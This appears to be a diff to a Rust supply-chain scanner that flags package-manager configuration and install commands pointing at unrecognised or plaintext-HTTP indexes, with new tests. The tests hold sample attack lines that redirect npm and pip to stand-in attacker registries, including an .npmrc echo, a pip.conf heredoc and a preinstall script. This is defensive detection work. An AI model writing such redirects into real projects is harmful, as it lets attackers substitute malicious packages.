@@ -14,12 +14,14 @@
 //! | `DEPSRC-003` | Medium | A config file routes one npm scope, or explicitly-pinned packages, to an unrecognised host |
 //! | `DEPSRC-004` | Medium | A config file turns off TLS verification for package downloads |
 //! | `DEPSRC-005` | High | A dependency is fetched directly from a URL on an unrecognised host |
-//! | `DEPSRC-006` | Medium | An install command in instructions or a script points pip / npm / uv / yarn / poetry at an unrecognised index |
-//! | `DEPSRC-007` | High | A package source is fetched over plaintext `http://` |
+//! | `DEPSRC-006` | Medium | An install command in instructions or a script (or `package.json` scripts) points pip / npm / uv / yarn / poetry at an unrecognised or plaintext-HTTP index, or writes that config line (`echo registry=... > .npmrc`, a heredoc into pip.conf) |
+//! | `DEPSRC-007` | High | Shipped configuration fetches a package source over plaintext `http://` |
 //!
 //! "Unrecognised" means not the ecosystem default, not a well-known vendor
 //! index (PyTorch, NVIDIA), not a public mirror of the default registry, and
-//! not a loopback or private-network address. The vendor list is deliberately
+//! not a loopback or private-network address. A code forge is recognised as
+//! the home of a direct git dependency, but not as an index or find-links
+//! page, which serves whatever one account there uploaded. The vendor list is deliberately
 //! short: routine vendor indexes appear in clean skills (`pypi.nvidia.com` in
 //! eleven NVIDIA skill files), and the severity policy keeps routine idioms
 //! out of the verdict.
@@ -192,6 +194,22 @@ fn judge(
     config: bool,
     what: &str,
 ) -> Option<(&'static str, Severity, u32, String)> {
+    if dest.plaintext && !config {
+        // A command in instructions is Medium whatever its flaw: a reviewer
+        // can see it. `pip install -i http://mirrors.aliyun.com/pypi/simple/`
+        // is how a great deal of documentation is written, and High here made
+        // one such line in a SKILL.md a HIGH verdict on its own.
+        return Some((
+            RULE_COMMAND,
+            Severity::Medium,
+            2,
+            format!(
+                "{what} fetches packages over plaintext HTTP from {} — anyone on the path \
+                 can substitute any package",
+                dest.display
+            ),
+        ));
+    }
     if dest.plaintext {
         return Some((
             RULE_PLAINTEXT,
@@ -204,7 +222,11 @@ fn judge(
             ),
         ));
     }
-    if dest.class != HostClass::Other {
+    // A forge is an ordinary home for a direct git dependency (see `direct`),
+    // but as an index or find-links page it serves whatever wheels one
+    // account there uploaded: `--find-links` on a GitHub releases page is an
+    // unvetted package source like any other.
+    if !matches!(dest.class, HostClass::Other | HostClass::Forge) {
         return None;
     }
     if !config {
@@ -255,17 +277,17 @@ fn judge(
 struct Out<'a> {
     file: &'a str,
     findings: Vec<Finding>,
+    /// (rule, line) pairs already reported. A set, not a scan of `findings`:
+    /// a hostile file with a redirect on each of a million lines must not
+    /// turn the dedupe quadratic.
+    seen: std::collections::HashSet<(&'static str, usize)>,
 }
 
 impl Out<'_> {
     fn push(&mut self, line: usize, verdict: Option<(&'static str, Severity, u32, String)>) {
         if let Some((rule, severity, weight, snippet)) = verdict {
             // One finding per rule per line.
-            if self
-                .findings
-                .iter()
-                .any(|f| f.rule == rule && f.line == Some(line))
-            {
+            if !self.seen.insert((rule, line)) {
                 return;
             }
             let mut f = finding(
@@ -700,40 +722,65 @@ fn cargo_config(text: &str, out: &mut Out) {
 /// enclosing element is found by looking back from each `<url>`, so one-line
 /// and pretty-printed XML read the same.
 fn maven(text: &str, out: &mut Out) {
-    let mut from = 0;
-    while let Some(pos) = text[from..].find("<url>") {
-        let start = from + pos + "<url>".len();
-        let Some(len) = text[start..].find("</url>") else {
-            break;
+    // One forward pass over the tags, tracking whether the cursor is inside a
+    // <mirror> or a (plugin) <repository>, and counting lines as it goes.
+    // Linear in the file: a hostile pom with 100,000 <url> elements costs one
+    // read, not 100,000 look-backs over everything before each of them.
+    let (mut mirror, mut repo) = (0i32, 0i32);
+    let (mut line, mut counted) = (1usize, 0usize);
+    let mut pos = 0usize;
+    while let Some(off) = text[pos..].find('<') {
+        let at = pos + off;
+        let rest = &text[at..];
+        let step = |tag: &str, depth: &mut i32, delta: i32| -> bool {
+            if rest.starts_with(tag) {
+                *depth = (*depth + delta).max(0);
+                true
+            } else {
+                false
+            }
         };
-        let url = text[start..start + len].trim();
-        let before = &text[..start];
-        let last = |tag: &str| before.rfind(tag).map(|p| p as i64).unwrap_or(-1);
-        let in_mirror = last("<mirror>") > last("</mirror>");
-        let in_repo = last("<repository>") > last("</repository>")
-            || last("<pluginRepository>") > last("</pluginRepository>");
-        let line = line_at(text, start);
-        if in_mirror {
-            out.dest(line, url, Op::Replace, true, "Maven mirror");
-        } else if in_repo {
-            out.dest(line, url, Op::Add, true, "Maven repository");
+        if step("<mirror>", &mut mirror, 1)
+            || step("</mirror>", &mut mirror, -1)
+            || step("<repository>", &mut repo, 1)
+            || step("</repository>", &mut repo, -1)
+            || step("<pluginRepository>", &mut repo, 1)
+            || step("</pluginRepository>", &mut repo, -1)
+        {
+            pos = at + 1;
+            continue;
         }
-        from = start + len;
+        if rest.starts_with("<url>") {
+            let start = at + "<url>".len();
+            let Some(len) = text[start..].find("</url>") else {
+                break;
+            };
+            line += text.as_bytes()[counted..start]
+                .iter()
+                .filter(|b| **b == b'\n')
+                .count();
+            counted = start;
+            let url = text[start..start + len].trim();
+            if mirror > 0 {
+                out.dest(line, url, Op::Replace, true, "Maven mirror");
+            } else if repo > 0 {
+                out.dest(line, url, Op::Add, true, "Maven repository");
+            }
+            pos = start + len;
+            continue;
+        }
+        pos = at + 1;
     }
-}
-
-fn line_at(text: &str, offset: usize) -> usize {
-    text.as_bytes()[..offset]
-        .iter()
-        .filter(|b| **b == b'\n')
-        .count()
-        + 1
 }
 
 fn package_json(text: &str, out: &mut Out) {
     let Ok(doc) = serde_json::from_str::<serde_json::Value>(text) else {
         return;
     };
+    // Each line lookup reads the file; past this many URL specs the finding
+    // points at line 1 rather than re-reading a hostile file per dependency.
+    const MAX_LINE_LOOKUPS: usize = 64;
+    let mut lookups = 0usize;
     for section in [
         "dependencies",
         "devDependencies",
@@ -753,11 +800,15 @@ fn package_json(text: &str, out: &mut Out) {
             }
             // Line of the spec in the original text, for the reader.
             let needle = format!("\"{name}\"");
-            let line = text
-                .lines()
-                .position(|l| l.contains(&needle) && l.contains(spec))
-                .map(|p| p + 1)
-                .unwrap_or(1);
+            lookups += 1;
+            let line = if lookups <= MAX_LINE_LOOKUPS {
+                text.lines()
+                    .position(|l| l.contains(&needle) && l.contains(spec))
+                    .map(|p| p + 1)
+                    .unwrap_or(1)
+            } else {
+                1
+            };
             out.direct(line, spec, &format!("npm dependency {name}"));
         }
     }
@@ -789,7 +840,7 @@ fn trigger() -> &'static regex::Regex {
 }
 
 /// Commands and env assignments in instructions and scripts.
-fn commands(text: &str, markdown_like: bool, out: &mut Out) {
+fn commands(text: &str, out: &mut Out) {
     if !trigger().is_match(text) {
         return;
     }
@@ -807,6 +858,21 @@ fn commands(text: &str, markdown_like: bool, out: &mut Out) {
             })
             .filter(|t| !t.is_empty())
             .collect();
+        // A config line written from a script or quoted in instructions:
+        // `echo "registry=https://..." > .npmrc`, a heredoc body writing
+        // pip.conf, or the line itself pasted into a code block. `registry`
+        // is also an ordinary word, keyword argument and (upper-case) Docker
+        // variable, so it needs the line to look like npm config, with npm's
+        // lower-case key; pip's hyphenated keys are never code.
+        let trimmed = raw
+            .trim_start_matches(|c: char| c.is_whitespace() || matches!(c, '>' | '-' | '"' | '\''));
+        let config_line = raw.to_ascii_lowercase().contains("npmrc")
+            || trimmed.starts_with("registry=")
+            || (trimmed.starts_with('@') && trimmed.contains(":registry="))
+            || matches!(
+                tokens.first().map(|t| t.to_ascii_lowercase()).as_deref(),
+                Some("echo" | "printf")
+            );
         let pip_context = tokens.iter().any(|t| {
             let t = t.to_ascii_lowercase();
             matches!(t.as_str(), "pip" | "pip3" | "uv" | "pipx")
@@ -829,6 +895,17 @@ fn commands(text: &str, markdown_like: bool, out: &mut Out) {
                 "-f" if pip_context => Some((Op::Add, "pip -f")),
                 "--registry" => Some((Op::Replace, "install command --registry")),
                 "-dmaven.repo.remote" => Some((Op::Replace, "mvn -Dmaven.repo.remote")),
+                "index-url" | "extra-index-url" | "find-links" => {
+                    Some((Op::Add, "pip configuration line"))
+                }
+                "registry" | "npmregistryserver"
+                    if config_line && matches!(*t, "registry" | "npmRegistryServer") =>
+                {
+                    Some((Op::Replace, "npm configuration line"))
+                }
+                k if config_line && k.starts_with('@') && k.ends_with(":registry") => {
+                    Some((Op::Scoped, "npm configuration line"))
+                }
                 env if env.starts_with("cargo_registries_") && env.ends_with("_index") => {
                     Some((Op::Scoped, "CARGO_REGISTRIES_*_INDEX"))
                 }
@@ -847,16 +924,23 @@ fn commands(text: &str, markdown_like: bool, out: &mut Out) {
                 out.dest(line, target, op, false, what);
                 continue;
             }
-            // `npm|yarn|pip config set <key> <url>`
-            if tl == "config"
-                && tokens.get(j + 1).map(|s| s.to_ascii_lowercase()) == Some("set".into())
-            {
+            // `npm|yarn|pnpm|pip config [--user|--global] set <key> <url>`, and
+            // npm's own shorthand `npm set <key> <url>`.
+            let prev = if j > 0 {
+                tokens[j - 1].to_ascii_lowercase()
+            } else {
+                String::new()
+            };
+            let is_set = tl == "set"
+                && (tokens[..j].iter().any(|t| t.eq_ignore_ascii_case("config"))
+                    || matches!(prev.as_str(), "npm" | "pnpm" | "yarn"));
+            if is_set {
                 let key = tokens
-                    .get(j + 2)
+                    .get(j + 1)
                     .copied()
                     .unwrap_or("")
                     .to_ascii_lowercase();
-                let val = tokens.get(j + 3).copied().unwrap_or("");
+                let val = tokens.get(j + 2).copied().unwrap_or("");
                 if key == "registry"
                     || key.ends_with(":registry")
                     || key.ends_with("index-url")
@@ -871,16 +955,6 @@ fn commands(text: &str, markdown_like: bool, out: &mut Out) {
             {
                 if let Some(url) = tokens[j + 2..].iter().find(|t| t.contains("://")) {
                     out.dest(line, url, Op::Add, false, "poetry source add");
-                }
-            }
-        }
-        // An .npmrc snippet quoted in documentation: `registry=https://...`.
-        if markdown_like {
-            let t = raw.trim_start_matches(|c: char| c.is_whitespace() || c == '>');
-            if let Some((k, v)) = t.split_once('=') {
-                let k = k.trim().to_ascii_lowercase();
-                if k == "registry" || (k.starts_with('@') && k.ends_with(":registry")) {
-                    out.dest(line, v.trim(), Op::Replace, false, ".npmrc snippet");
                 }
             }
         }
@@ -908,20 +982,35 @@ fn config_kind(name: &str) -> Option<&'static str> {
 }
 
 /// Files whose lines may carry install commands.
-fn command_surface(name: &str) -> Option<bool> {
+fn command_surface(name: &str) -> bool {
     let lower = name.to_ascii_lowercase();
     let ext = lower.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
-    match ext {
-        "md" | "mdx" | "markdown" | "txt" | "rst" | "mdc" => Some(true),
-        "sh" | "bash" | "zsh" | "ps1" | "bat" | "cmd" | "py" | "js" | "mjs" | "cjs" | "ts"
-        | "yml" | "yaml" | "json" | "toml" | "cfg" | "ini" => Some(false),
-        _ if matches!(lower.as_str(), "dockerfile" | "containerfile" | "makefile")
-            || lower.starts_with("dockerfile.") =>
-        {
-            Some(false)
-        }
-        _ => None,
-    }
+    matches!(
+        ext,
+        "md" | "mdx"
+            | "markdown"
+            | "txt"
+            | "rst"
+            | "mdc"
+            | "sh"
+            | "bash"
+            | "zsh"
+            | "ps1"
+            | "bat"
+            | "cmd"
+            | "py"
+            | "js"
+            | "mjs"
+            | "cjs"
+            | "ts"
+            | "yml"
+            | "yaml"
+            | "json"
+            | "toml"
+            | "cfg"
+            | "ini"
+    ) || matches!(lower.as_str(), "dockerfile" | "containerfile" | "makefile")
+        || lower.starts_with("dockerfile.")
 }
 
 /// Every dependency-source finding for one file.
@@ -930,6 +1019,7 @@ pub fn scan_file(rel_path: &str, contents: &str) -> Vec<Finding> {
     let mut out = Out {
         file: rel_path,
         findings: Vec::new(),
+        seen: std::collections::HashSet::new(),
     };
     let lname = name.to_ascii_lowercase();
     if rel_path.rsplit('/').nth(1) == Some(".cargo")
@@ -953,11 +1043,16 @@ pub fn scan_file(rel_path: &str, contents: &str) -> Vec<Finding> {
         Some("pip") => pip_conf(contents, &mut out),
         Some("toml") => pyproject(contents, &name.to_ascii_lowercase(), &mut out),
         Some("bunfig") => bunfig(contents, &mut out),
-        Some("package.json") => package_json(contents, &mut out),
+        Some("package.json") => {
+            package_json(contents, &mut out);
+            // `scripts` run at install and build time: a `--registry` there
+            // redirects the installs they perform.
+            commands(contents, &mut out);
+        }
         Some("requirements") => requirements(contents, &mut out),
         _ => {
-            if let Some(markdown_like) = command_surface(name) {
-                commands(contents, markdown_like, &mut out);
+            if command_surface(name) {
+                commands(contents, &mut out);
             }
         }
     }
@@ -1164,6 +1259,94 @@ mod tests {
     }
 
     #[test]
+    fn config_written_by_a_script_or_quoted_in_instructions() {
+        // The registry line a setup script writes into .npmrc.
+        assert!(has(
+            "setup.sh",
+            "echo \"registry=https://npm.attacker.example/\" > .npmrc\n",
+            RULE_COMMAND
+        ));
+        assert!(has(
+            "SKILL.md",
+            "```bash\necho '@acme:registry=https://npm.attacker.example/' >> .npmrc\n```\n",
+            RULE_COMMAND
+        ));
+        // A heredoc body writing pip.conf.
+        let heredoc = "cat > ~/.config/pip/pip.conf <<EOF\n[global]\n\
+                       index-url = https://pip.attacker.example/simple\nEOF\n";
+        assert!(has("setup.sh", heredoc, RULE_COMMAND));
+        // npm's `set` shorthand, and flags between `config` and `set`.
+        assert!(has(
+            "setup.sh",
+            "npm set registry https://npm.attacker.example/\n",
+            RULE_COMMAND
+        ));
+        assert!(has(
+            "setup.sh",
+            "pip config --user set global.index-url https://pip.attacker.example/simple\n",
+            RULE_COMMAND
+        ));
+        // package.json scripts run installs too.
+        let pj = r#"{"name": "x", "scripts": {"preinstall": "npm install --registry https://npm.attacker.example/ helper"}}"#;
+        assert!(has("package.json", pj, RULE_COMMAND));
+        // Not config: a keyword argument, a registry word in prose, a
+        // publishConfig block, the vendor index in a heredoc.
+        for (path, ok) in [
+            ("push.py", "client.login(registry=\"https://ghcr.io\", username=u)\n"),
+            ("SKILL.md", "Set the registry to your team's mirror before publishing.\n"),
+            // A Docker registry variable is not npm's lower-case key.
+            ("README.md", "REGISTRY=https://registry.example.com\n"),
+            ("deploy.sh", "echo \"REGISTRY=https://registry.example.com\" >> .env\n"),
+            (
+                "package.json",
+                r#"{"name": "x", "publishConfig": {"registry": "https://npm.pkg.github.com"}}"#,
+            ),
+            (
+                "setup.sh",
+                "cat > pip.conf <<EOF\nextra-index-url = https://download.pytorch.org/whl/cu121\nEOF\n",
+            ),
+        ] {
+            let r = rules(path, ok);
+            assert!(
+                !r.iter().any(|(id, _)| id.starts_with("DEPSRC")),
+                "{path}: {ok} -> {r:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_forge_is_not_a_vetted_index() {
+        // find-links on a releases page serves whatever that account uploaded.
+        assert!(has(
+            "requirements.txt",
+            "--find-links https://github.com/attacker-org/wheels/releases/expanded_assets/v1\n",
+            RULE_ADD
+        ));
+        // A git dependency on a forge is still the ordinary way to pin
+        // unreleased code (SUPPLY-003 reports branch pins).
+        assert!(rules(
+            "requirements.txt",
+            "lib @ git+https://github.com/org/lib@v1.2\n"
+        )
+        .is_empty());
+    }
+
+    #[test]
+    fn hostile_sizes_stay_linear() {
+        // A million-line requirements file and a pom with many <url>s must
+        // not turn the per-line dedupe or the Maven look-back quadratic.
+        let req = "--extra-index-url https://pkgs.attacker.example/simple\n".repeat(50_000);
+        let t = std::time::Instant::now();
+        assert_eq!(scan_file("requirements.txt", &req).len(), 50_000);
+        let pom = format!(
+            "<project><repositories>{}</repositories></project>",
+            "<repository><url>https://maven.attacker.example/r</url></repository>\n".repeat(20_000)
+        );
+        assert_eq!(scan_file("pom.xml", &pom).len(), 20_000);
+        assert!(t.elapsed().as_secs() < 20, "{:?}", t.elapsed());
+    }
+
+    #[test]
     fn package_json_direct_urls() {
         let pj = r#"{"dependencies": {"a": "^1.0.0", "b": "https://cdn.attacker.example/b-1.0.tgz",
             "c": "github:org/c", "d": "git+https://github.com/org/d.git#v1.0.0",
@@ -1204,9 +1387,29 @@ mod tests {
             "registry=https://npm.attacker.example/\n",
             RULE_COMMAND
         ));
-        assert!(has(
+        // Plaintext in a command is still reported, at the command's Medium.
+        let r = rules(
             "run.sh",
             "pip install -i http://pkgs.example.net/simple x\n",
+        );
+        assert_eq!(
+            r,
+            vec![(RULE_COMMAND.to_string(), Severity::Medium)],
+            "{r:?}"
+        );
+        let r = rules(
+            "SKILL.md",
+            "pip install -i http://mirrors.aliyun.com/pypi/simple/ requests\n",
+        );
+        assert_eq!(
+            r,
+            vec![(RULE_COMMAND.to_string(), Severity::Medium)],
+            "{r:?}"
+        );
+        // ...and High in shipped configuration.
+        assert!(has(
+            "requirements.txt",
+            "-i http://pkgs.example.net/simple\n",
             RULE_PLAINTEXT
         ));
         // Routine: vendor indexes, grep -i, rm -f, a registry word in prose,
